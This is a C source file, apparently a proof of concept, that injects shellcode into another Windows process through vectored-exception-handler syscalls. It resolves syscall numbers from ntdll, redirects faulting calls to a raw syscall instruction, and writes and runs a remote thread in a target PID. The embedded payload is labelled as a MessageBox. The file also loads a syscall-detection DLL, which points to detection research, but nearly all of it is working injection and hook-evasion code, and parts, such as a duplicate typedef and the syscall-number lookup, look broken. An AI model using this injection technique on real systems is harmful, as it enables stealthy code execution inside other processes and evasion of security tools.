#pragma once
#include <Windows.h>
#include <stdio.h>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)


typedef struct _PS_ATTRIBUTE
{
	ULONG  Attribute;
	SIZE_T Size;
	union
	{
		ULONG Value;
		PVOID ValuePtr;
	} u1;
	PSIZE_T ReturnLength;
} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

#ifndef InitializeObjectAttributes
#define InitializeObjectAttributes( p, n, a, r, s ) { \
	(p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
	(p)->RootDirectory = r;                           \
	(p)->Attributes = a;                              \
	(p)->ObjectName = n;                              \
	(p)->SecurityDescriptor = s;                      \
	(p)->SecurityQualityOfService = NULL;             \
}
#endif

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T       TotalLength;
	PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;


typedef NTSYSAPI NTSTATUS(NTAPI* _NtProtectVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	PULONG NumberOfBytesToProtect,
	ULONG NewAccessProtection,
	PULONG OldAccessProtection);


typedef NTSYSAPI NTSTATUS(NTAPI* _NtOpenProcess)(
	OUT PHANDLE ProcessHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN PCLIENT_ID ClientId OPTIONAL);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PSIZE_T RegionSize,
	IN ULONG AllocationType,
	IN ULONG Protect);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtProtectVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN SIZE_T NumberOfBytesToWrite,
	OUT PSIZE_T NumberOfBytesWritten OPTIONAL);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateThreadEx)(
	OUT PHANDLE ThreadHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN HANDLE ProcessHandle,
	IN PVOID StartRoutine,
	IN PVOID Argument OPTIONAL,
	IN ULONG CreateFlags,
	IN SIZE_T ZeroBits,
	IN SIZE_T StackSize,
	IN SIZE_T MaximumStackSize,
	IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);

typedef NTSYSAPI NTSTATUS(NTAPI* _NtFreeVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG FreeType);



EXTERN_C DWORD64 SetSysCall(DWORD offset);

BYTE* FindSyscallAddr(ULONG_PTR base) {
	BYTE* func_base = (BYTE*)(base);
	BYTE* temp_base = 0x00;
	//0F05 syscall
	while (*func_base != 0xc3) {
		temp_base = func_base;
		if (*temp_base == 0x0f) {
			temp_base++;
			if (*temp_base == 0x05) {
				temp_base++;
				if (*temp_base == 0xc3) {
					temp_base = func_base;
					break;
				}
			}
		}
		else {
			func_base++;
			temp_base = 0x00;
		}
	}
	return temp_base;
}


ULONG_PTR g_syscall_addr = 0x00;
ULONG HandleException(PEXCEPTION_POINTERS exception_ptr) {
	// EXCEPTION_ACCESS_VIOLATION check is not stable, some situation like during loading library 
	// might cause EXCEPTION_ACCESS_VIOLATION 
	// TODO: Add more checks for stability
	if (exception_ptr->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
		// Todo: decode syscall number in Rip if encoded
		// modifing the registers
		exception_ptr->ContextRecord->R10 = exception_ptr->ContextRecord->Rcx;
		// RIP holds the syscall number
		exception_ptr->ContextRecord->Rax = exception_ptr->ContextRecord->Rip;
		// setting global address
		exception_ptr->ContextRecord->Rip = g_syscall_addr;
		return EXCEPTION_CONTINUE_EXECUTION;
	}

}

ULONG GetSysCallNumber(char* FunctionName) {
	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
	PVOID FunctionAddress = GetProcAddress(ntdll, FunctionName);
	
	// Getting the address at which the instruciton that will invokes the syscall
	BYTE* syscall_instruction = FindSyscallAddr((ULONG_PTR)FunctionAddress);

	ULONG SysCallNumber = 0;
	ULONG Offset = 0;

	// Determine the offset of the function within ntdll.dll
	Offset = (ULONG)((ULONG_PTR)syscall_instruction - (ULONG_PTR)GetModuleHandleW(L"ntdll.dll"));

	// The syscall number is stored in the second half of the instruction
	SysCallNumber = *((PULONG)(Offset + 2));

	return SysCallNumber;
}


void VectoredSyscalPOC(unsigned char payload[], SIZE_T payload_size, int pid) {
	ULONG_PTR syscall_addr = 0x00;
	FARPROC drawtext = GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwDrawText");
	if (drawtext == NULL) {
		printf("[-] Error GetProcess Address\n");
		exit(-1);
	}
	syscall_addr = (ULONG_PTR)FindSyscallAddr((ULONG_PTR)drawtext);

	if (syscall_addr == NULL) {
		printf("[-] Error Resolving syscall Address\n");
		exit(-1);
	}
	// storing syscall address globally
	g_syscall_addr = syscall_addr;

	//// Init vectored handle
	AddVectoredExceptionHandler(TRUE, (PVECTORED_EXCEPTION_HANDLER)HandleException);

	NTSTATUS status;
	// Note: Below syscall might differ system to system 
	// it's better to grab the syscall numbers dynamically

	ULONG SysNtOpenProcess = GetSysCallNumber("NtOpenProcess");
	ULONG SysNtAllocateVirtualMemory = GetSysCallNumber("NtAllocateVirtualMemory");
	ULONG SysNtWriteVirtualMemory = GetSysCallNumber("NtWriteVirtualMemory");
	ULONG SysNtProtectVirtualMemory = GetSysCallNumber("NtProtectVirtualMemory");
	ULONG SysNtCreateThreadEx = GetSysCallNumber("NtCreateThreadEx");
	ULONG SysNtFreeVirtualMemory = GetSysCallNumber("NtFreeVirtualMemory");


	// Todo: encode syscall numbers
	// init Nt APIs
	// Instead of actual Nt API address we'll set the API with syscall number
	// and calling each Nt APIs causes an exception which'll be later handled from the
	// registered vectored handler. The reason behind initializing each NtAPIs with
	// their corresponding syscall number is to pass the syscall number to the 
	// exception handler via RIP register 

	_NtOpenProcess pNtOpenProcess = (_NtOpenProcess)SysNtOpenProcess;
	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)SysNtAllocateVirtualMemory;
	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)SysNtWriteVirtualMemory;
	_NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)SysNtProtectVirtualMemory;
	_NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)SysNtCreateThreadEx;
	_NtFreeVirtualMemory pNtFreeVirtualMemory = (_NtFreeVirtualMemory)SysNtFreeVirtualMemory;

	HANDLE hProcess = { INVALID_HANDLE_VALUE };
	HANDLE hThread = NULL;
	HMODULE pNtdllModule = NULL;
	CLIENT_ID clID = { 0 };
	DWORD mPID = pid;
	OBJECT_ATTRIBUTES objAttr;
	PVOID remoteBase = 0;
	SIZE_T bytesWritten = 0;
	SIZE_T regionSize = 0;
	unsigned long oldProtection = 0;
	// Getting handle to module
	//printf("loaded syscall before detect\n");
	//system("pause");
	// Init Object Attributes
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	clID.UniqueProcess = (void*)mPID;
	clID.UniqueThread = 0;
	if (!LoadLibraryA("syscall-detect.dll")) {
		printf("Failed to load library \n");
	}
	printf("[+] Starting Vectored Syscall... \n");
	system("pause");
	//printf("loaded syscall detect\n");
	// open handle to target process
	status = pNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clID);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to Open Process: %x \n", status);
		exit(-1);
	}

	// Allocate memory in remote process
	regionSize = payload_size;
	status = pNtAllocateVirtualMemory(hProcess, &remoteBase, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!NT_SUCCESS(status)) {
		printf("[-] Remote Allocation Failed: %x \n", status);
		exit(-1);
	}

	// Write payload to remote process
	status = pNtWriteVirtualMemory(hProcess, remoteBase, payload, payload_size, &bytesWritten);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to write payload in remote process: %x \n", status);
		exit(-1);
	}

	// Change Memory Protection: RW -> RX
	status = pNtProtectVirtualMemory(hProcess, &remoteBase, &regionSize, PAGE_EXECUTE_READ, &oldProtection);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to change memory protection from RW to RX: %x \n", status);
		exit(-1);
	}

	// Execute Remote Thread
	status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)remoteBase, NULL, FALSE, 0, 0, 0, NULL);
	if (!NT_SUCCESS(status)) {
		printf("[-] Failed to Execute Remote Thread: %x \n", status);
		exit(-1);
	}

	printf("[+] Injected shellcode!! \n");
	system("pause");
}


int main(int argc, char** argv) {
	// parsing argument
	int pid = 0;
	if (argc < 2 || argc > 2) {
		printf("[!] filename.exe <PID> \n");
		exit(-1);
	}
	pid = atoi(argv[1]);

	// MessageBox "hello world"
	unsigned char payload[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
		"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
		"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
		"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
		"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
		"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
		"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
		"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
		"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
		"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
		"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
		"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
		"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
		"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
		"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
		"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
		"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
		"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
		"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
		"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
		"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
		"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
		"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
		"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
		"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
		"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
		"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
		"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
		"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
	// Size of paylaod
	SIZE_T payload_size = sizeof(payload);
	// Invoke Classic Process Injection
	VectoredSyscalPOC(payload, payload_size, pid);
}
